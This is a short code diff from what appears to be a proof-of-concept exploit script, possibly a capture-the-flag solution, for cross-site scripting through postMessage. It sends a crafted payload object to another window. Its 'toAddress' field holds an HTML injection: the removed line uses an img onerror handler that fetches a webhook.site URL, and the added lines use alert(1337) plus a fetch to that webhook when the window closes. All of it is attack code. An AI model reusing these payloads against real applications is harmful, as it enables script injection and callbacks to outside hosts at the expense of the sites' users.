@@ -37,13 +37,14 @@ const payload = {
   transaction: {
     currency: '1337COIN',
     amount: 1,
-    toAddress: '"><img src=a onerror="fetch(`https://webhook.site/b9386d0b-c63f-4066-b155-83a22d1c7055/XSSIsHere`)">'
+    toAddress: '"><img src=x onerror=alert(1337)>'
   }
 };
 
 const interval = setInterval(() => {
   if (!win || win.closed) {
     clearInterval(interval);
+    fetch('https://webhook.site/b9386d0b-c63f-4066-b155-83a22d1c7055/doesntworksss');
     return;
   }
   win.postMessage(payload, "*");
